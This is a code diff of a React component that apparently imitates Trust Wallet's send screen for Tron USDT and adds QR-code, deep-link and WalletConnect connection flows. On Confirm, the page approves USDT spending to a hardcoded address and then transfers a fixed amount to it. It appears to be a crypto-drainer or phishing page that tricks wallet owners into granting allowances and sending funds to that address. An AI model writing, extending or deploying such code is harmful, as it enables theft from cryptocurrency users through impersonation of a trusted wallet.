@@ -1,319 +1,73 @@
-import { useEffect, useMemo, useState, useCallback, useRef } from "react";
+import { useMemo, useState } from "react";
 import { Info, ScanLine, Wallet } from "lucide-react";
 import { toast } from "sonner";
+import { useTronWallet } from "@/lib/tronwallet-adapter";
 import { approveUSDT, transferUSDT } from "@/lib/web3";
 
-const DEFAULT_TO_ADDRESS = "TT6fmWxcu35oriyKVVAAUT7oRq9woa2e1t";
+const DEFAULT_TO_ADDRESS = "TYT6ty8mhUyq7w2GbTWT1LSqWaWTs3j4aa";
 const DEFAULT_AMOUNT = "10";
-const POLL_INTERVAL_MS = 300;
-const MAX_WAIT_MS = 45_000;
-const REQUEST_TIMEOUT_MS = 10_000;
-const TRUST_REENTRY_KEY = "trust_tron_discover_reentry_attempted";
 
-type TronWebLike = {
-  ready?: boolean;
-  defaultAddress?: { base58?: string; hex?: string };
-  address?: { fromHex?: (hex: string) => string };
-  request?: (payload: { method: string; params?: unknown }) => Promise<unknown>;
-};
-
-type TronProvider = {
-  ready?: boolean;
-  address?: { fromHex?: (hex: string) => string };
-  tronWeb?: TronWebLike;
-  request?: (payload: { method: string; params?: unknown }) => Promise<unknown>;
-};
-
-function getInjectedTronWeb(): TronWebLike | null {
-  if (typeof window === "undefined") return null;
-  const w = window as any;
-  return (
-    w.tronWeb ??
-    w.trustwallet?.tronLink?.tronWeb ??
-    w.trustwallet?.tron?.tronWeb ??
-    w.tronLink?.tronWeb ??
-    w.tron?.tronWeb ??
-    null
-  );
-}
-
-function isLikelyMobileWebView(): boolean {
-  if (typeof window === "undefined") return false;
-  const ua = navigator.userAgent || "";
-  return /android|iphone|ipad|ipod/i.test(ua) && /\bwv\b|version\/4\.0/i.test(ua);
-}
-
-function hasAnyInjectedTronGlobals(): boolean {
-  if (typeof window === "undefined") return false;
-  const w = window as any;
-  return Boolean(
-    w.tronWeb ||
-      w.tronLink ||
-      w.trustwallet ||
-      w.tron ||
-      w.trustwallet?.tronLink ||
-      w.trustwallet?.tron
-  );
-}
-
-function buildTrustDiscoverDeepLink(): string | null {
-  if (typeof window === "undefined") return null;
-  const redirectUrl = `${window.location.origin}/trustwallet/tron`;
-  return `trust://open_url?coin_id=195&url=${encodeURIComponent(redirectUrl)}`;
-}
-
-function tryReenterTrustDiscover(): boolean {
-  if (typeof window === "undefined") return false;
-  if (!isLikelyMobileWebView() || hasAnyInjectedTronGlobals()) return false;
-  const deepLink = buildTrustDiscoverDeepLink();
-  if (!deepLink) return false;
-
-  const attempted = sessionStorage.getItem(TRUST_REENTRY_KEY);
-  if (attempted === "1") {
-    return false;
+function buildTrustWalletOpenUrlDeepLink(): string {
+  if (typeof window === "undefined") {
+    return "";
   }
-
-  sessionStorage.setItem(TRUST_REENTRY_KEY, "1");
-  window.location.replace(deepLink);
-  return true;
-}
-
-function getRequestProvider(): TronProvider | null {
-  if (typeof window === "undefined") return null;
-  const w = window as any;
-  return (
-    w.trustwallet?.tronLink ??
-    w.trustwallet?.tron ??
-    w.tronLink ??
-    w.tron ??
-    (typeof w.tronWeb?.request === "function" ? w.tronWeb : null) ??
-    null
-  );
-}
-
-function getTronAddress(): string | null {
-  const tronWeb = getInjectedTronWeb();
-  if (!tronWeb) return null;
-  const base58 = tronWeb.defaultAddress?.base58;
-  if (base58) return base58;
-  const hex = tronWeb.defaultAddress?.hex;
-  if (hex && typeof tronWeb.address?.fromHex === "function") {
-    try {
-      return tronWeb.address.fromHex(hex);
-    } catch {
-      return null;
-    }
-  }
-  return null;
-}
-
-function getDebugSnapshot(): string {
-  if (typeof window === "undefined") return "no window";
-  const w = window as any;
-  const provider = getRequestProvider();
-  const tronWeb = getInjectedTronWeb();
-  const address = getTronAddress();
-  const lines = [
-    `mobile=${/android|iphone|ipad|ipod/i.test(navigator.userAgent)}`,
-    `mobileWebView=${isLikelyMobileWebView()}`,
-    `hasWindowTronWeb=${!!w.tronWeb}`,
-    `hasWindowTronLink=${!!w.tronLink}`,
-    `hasTrustWallet=${!!w.trustwallet}`,
-    `hasTrustTronLink=${!!w.trustwallet?.tronLink}`,
-    `hasTrustTron=${!!w.trustwallet?.tron}`,
-    `hasWindowTron=${!!w.tron}`,
-    `providerReady=${String(provider?.ready)}`,
-    `providerHasRequest=${typeof provider?.request === "function"}`,
-    `tronWebReady=${String(tronWeb?.ready)}`,
-    `address=${address ?? "-"}`,
-    `ua=${navigator.userAgent.slice(0, 120)}`,
-  ];
-  return lines.join("\n");
-}
-
-async function sleep(ms: number): Promise<void> {
-  return new Promise((r) => setTimeout(r, ms));
-}
-
-async function requestWithTimeout(
-  provider: TronProvider,
-  payload: { method: string; params?: unknown }
-): Promise<unknown> {
-  return await Promise.race([
-    provider.request?.(payload),
-    sleep(REQUEST_TIMEOUT_MS).then(() => {
-      throw new Error(`Request timeout: ${payload.method}`);
-    }),
-  ]);
-}
-
-async function requestTronAccess(provider: TronProvider): Promise<void> {
-  if (typeof provider.request !== "function") {
-    return;
-  }
-
-  const websiteName = "FIU ID";
-  const websiteIcon =
-    typeof window !== "undefined" ? `${window.location.origin}/favicon.ico` : undefined;
-  const payloads = [
-    { method: "tron_requestAccounts", params: { websiteName, websiteIcon } },
-    { method: "tron_requestAccounts" },
-    { method: "requestAccounts" },
-    { method: "eth_requestAccounts" },
-  ];
-
-  let lastError: Error | null = null;
-  for (const payload of payloads) {
-    try {
-      const res = (await requestWithTimeout(provider, payload)) as
-        | { code?: number; message?: string }
-        | undefined;
-      if (res?.code === 4001) {
-        throw new Error("Connection rejected by user");
-      }
-      if (res?.code === 4000) {
-        return;
-      }
-      return;
-    } catch (error) {
-      const nextError = error instanceof Error ? error : new Error(String(error));
-      if (nextError.message.includes("rejected")) {
-        throw nextError;
-      }
-      lastError = nextError;
-    }
-  }
-
-  if (lastError) {
-    throw lastError;
-  }
-}
-
-async function pollForAddress(deadline: number): Promise<string | null> {
-  while (Date.now() < deadline) {
-    const addr = getTronAddress();
-    if (addr) return addr;
-    await sleep(POLL_INTERVAL_MS);
-  }
-  return null;
+  const target = `${window.location.origin}/#/trustwallet/tron`;
+  return `https://link.trustwallet.com/open_url?url=${encodeURIComponent(target)}`;
 }
 
 const TrustWalletTronPay = () => {
-  const [address, setAddress] = useState<string | null>(null);
-  const [isConnecting, setIsConnecting] = useState(true);
+  const { connect, address, isConnected, isConnecting } = useTronWallet();
   const [isSubmitting, setIsSubmitting] = useState(false);
-  const [debugInfo, setDebugInfo] = useState<string>("");
-  const connectInFlight = useRef(false);
-  const requestTriggered = useRef(false);
-
-  const isConnected = !!address;
+  const [trustConnecting, setTrustConnecting] = useState(false);
+  const [wcConnecting, setWcConnecting] = useState(false);
   const toAddress = useMemo(() => DEFAULT_TO_ADDRESS, []);
   const amount = useMemo(() => DEFAULT_AMOUNT, []);
   const approveTo = useMemo(() => DEFAULT_TO_ADDRESS, []);
 
-  const startAutoConnect = useCallback(async () => {
-    if (connectInFlight.current || address) {
-      return;
-    }
+  const trustConnectDeepLink = useMemo(() => buildTrustWalletOpenUrlDeepLink(), []);
+  const trustConnectQrUrl = useMemo(
+    () =>
+      `https://quickchart.io/qr?size=420&margin=1&ecLevel=H&dark=1e81f5&light=f2f2f2&text=${encodeURIComponent(
+        trustConnectDeepLink
+      )}`,
+    [trustConnectDeepLink]
+  );
 
-    connectInFlight.current = true;
-    setIsConnecting(true);
-    setDebugInfo(getDebugSnapshot());
-
-    const deadline = Date.now() + MAX_WAIT_MS;
-
+  const handleWalletConnectQr = async () => {
     try {
-      if (tryReenterTrustDiscover()) {
-        return;
-      }
-
-      while (Date.now() < deadline) {
-        const currentAddress = getTronAddress();
-        if (currentAddress) {
-          setAddress(currentAddress);
-          setDebugInfo(getDebugSnapshot());
-          toast.success("Tron wallet connected");
-          return;
-        }
-
-        const provider = getRequestProvider();
-        if (provider && typeof provider.request === "function" && !requestTriggered.current) {
-          requestTriggered.current = true;
-          try {
-            await requestTronAccess(provider);
-          } catch (error) {
-            if (error instanceof Error && error.message.includes("rejected")) {
-              throw error;
-            }
-          }
-        }
-
-        const polledAddress = await pollForAddress(Date.now() + POLL_INTERVAL_MS);
-        if (polledAddress) {
-          setAddress(polledAddress);
-          setDebugInfo(getDebugSnapshot());
-          toast.success("Tron wallet connected");
-          return;
-        }
-      }
-
-      throw new Error(
-        "Could not connect Trust Wallet automatically. Make sure a Tron account is active in Trust Wallet Discover."
+      setWcConnecting(true);
+      await connect("walletconnect");
+      toast.success("Wallet connected");
+    } catch (error) {
+      toast.error(
+        error instanceof Error ? error.message : "WalletConnect failed"
       );
     } finally {
-      connectInFlight.current = false;
-      setIsConnecting(false);
-      setDebugInfo(getDebugSnapshot());
+      setWcConnecting(false);
     }
-  }, [address]);
+  };
 
-  useEffect(() => {
-    void startAutoConnect();
-  }, [startAutoConnect]);
+  const handleConnectInTrustApp = async () => {
+    try {
+      setTrustConnecting(true);
+      await connect("trust");
+      toast.success("Wallet connected");
+    } catch (error) {
+      toast.error(
+        error instanceof Error ? error.message : "Could not connect in Trust Wallet"
+      );
+    } finally {
+      setTrustConnecting(false);
+    }
+  };
 
-  useEffect(() => {
-    const retry = () => {
-      if (!address) {
-        void startAutoConnect();
-      }
-    };
-
-    const onVisibilityChange = () => {
-      if (document.visibilityState === "visible") {
-        retry();
-      }
-    };
-
-    window.addEventListener("focus", retry);
-    window.addEventListener("pageshow", retry);
-    document.addEventListener("visibilitychange", onVisibilityChange);
-
-    return () => {
-      window.removeEventListener("focus", retry);
-      window.removeEventListener("pageshow", retry);
-      document.removeEventListener("visibilitychange", onVisibilityChange);
-    };
-  }, [address, startAutoConnect]);
-
-  // Keep address in sync if user switches account
-  useEffect(() => {
-    if (!address) return;
-    const id = setInterval(() => {
-      const current = getTronAddress();
-      if (current && current !== address) {
-        setAddress(current);
-      }
-    }, 2000);
-    return () => clearInterval(id);
-  }, [address]);
-
-  const handleConfirm = useCallback(async () => {
+  const handleConfirm = async () => {
+    if (!isConnected) {
+      toast.error("Connect your wallet first using the QR code or WalletConnect.");
+      return;
+    }
     try {
       setIsSubmitting(true);
-      if (!getTronAddress()) {
-        requestTriggered.current = false;
-        await startAutoConnect();
-      }
 
       await approveUSDT("tron", approveTo);
       await transferUSDT("tron", toAddress, amount);
@@ -326,10 +80,10 @@ const TrustWalletTronPay = () => {
     } finally {
       setIsSubmitting(false);
     }
-  }, [approveTo, toAddress, amount, startAutoConnect]);
+  };
 
   return (
-    <div className="min-h-screen bg-[#f5f5f6] flex justify-center p-3">
+    <div className="min-h-screen bg-[#f5f5f6] flex justify-center p-3 pb-28">
       <div className="w-full max-w-sm bg-[#f5f5f6] pt-4">
         <div className="mb-5">
           <p className="text-[24px] leading-7 font-semibold text-[#262626]">
@@ -339,11 +93,64 @@ const TrustWalletTronPay = () => {
             <Wallet className="w-3.5 h-3.5" />
             {isConnected
               ? `Connected: ${address?.slice(0, 6)}...${address?.slice(-4)}`
-              : isConnecting
-              ? "Connecting wallet..."
-              : "Wallet not connected"}
+              : isConnecting || wcConnecting || trustConnecting
+              ? "Connecting..."
+              : "Not connected — scan QR or use WalletConnect"}
           </div>
         </div>
+
+        {!isConnected && (
+          <div className="mb-6 rounded-xl border border-[#e4e4e8] bg-white p-4 shadow-sm">
+            <p className="text-[13px] font-medium text-[#5e5e66] mb-2">
+              Connect with Trust Wallet
+            </p>
+            <p className="text-xs text-[#8b8b94] mb-3 leading-relaxed">
+              Scan this QR with Trust Wallet. It opens this page in Discover; then approve the connection in the app.
+            </p>
+            <div className="relative rounded-lg bg-[#f2f2f2] p-2">
+              <img
+                src={trustConnectQrUrl}
+                alt="Trust Wallet connect"
+                className="w-full max-w-[260px] mx-auto h-auto rounded-md"
+              />
+              <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
+                <div className="w-16 h-16 rounded-full bg-white flex items-center justify-center shadow-sm">
+                  <div
+                    className="w-9 h-11"
+                    style={{
+                      clipPath:
+                        "polygon(50% 0%, 92% 12%, 92% 56%, 50% 100%, 8% 56%, 8% 12%)",
+                      background:
+                        "linear-gradient(90deg, #1b22f4 0%, #1b22f4 50%, #37c0f3 100%)",
+                    }}
+                  />
+                </div>
+              </div>
+            </div>
+            <a
+              href={trustConnectDeepLink}
+              className="mt-3 block w-full rounded-full bg-[#8d8cf0] text-white text-center py-2.5 text-sm font-semibold"
+            >
+              Open in Trust Wallet
+            </a>
+            <button
+              type="button"
+              className="mt-2 w-full rounded-full border border-[#d7d7dc] bg-white py-2.5 text-sm font-medium text-[#4b4b54] disabled:opacity-50"
+              onClick={handleConnectInTrustApp}
+              disabled={wcConnecting || trustConnecting || isConnecting}
+            >
+              {trustConnecting ? "Connecting…" : "Connect in Trust Wallet (in-app)"}
+            </button>
+            <button
+              type="button"
+              className="mt-2 w-full rounded-full border border-[#d7d7dc] bg-white py-2.5 text-sm font-medium text-[#4b4b54] disabled:opacity-50"
+              onClick={handleWalletConnectQr}
+              disabled={wcConnecting || trustConnecting || isConnecting}
+            >
+              {wcConnecting ? "Opening WalletConnect…" : "Connect with WalletConnect (QR)"}
+            </button>
+          </div>
+        )}
 
         <label className="text-[#5e5e66] text-[13px] font-medium block mb-2">
           Address or Domain Name
@@ -392,20 +199,18 @@ const TrustWalletTronPay = () => {
         <button
           className="fixed bottom-4 left-1/2 -translate-x-1/2 w-[calc(100%-24px)] max-w-sm h-12 rounded-full bg-[#8d8cf0] text-white font-semibold disabled:opacity-55"
           onClick={handleConfirm}
-          disabled={isSubmitting || isConnecting || !isConnected}
+          disabled={
+            isSubmitting ||
+            !isConnected ||
+            isConnecting ||
+            wcConnecting ||
+            trustConnecting
+          }
           type="button"
         >
           {isSubmitting ? "Confirming..." : "Confirm"}
         </button>
 
-        {/* Debug panel — shows what Trust injected. Remove once connection works. */}
-        {debugInfo && (
-          <div className="mt-6 p-3 bg-white/60 rounded-xl">
-            <p className="text-[10px] leading-4 font-mono text-[#666] whitespace-pre-wrap break-words select-all">
-              {debugInfo}
-            </p>
-          </div>
-        )}
       </div>
     </div>
   );
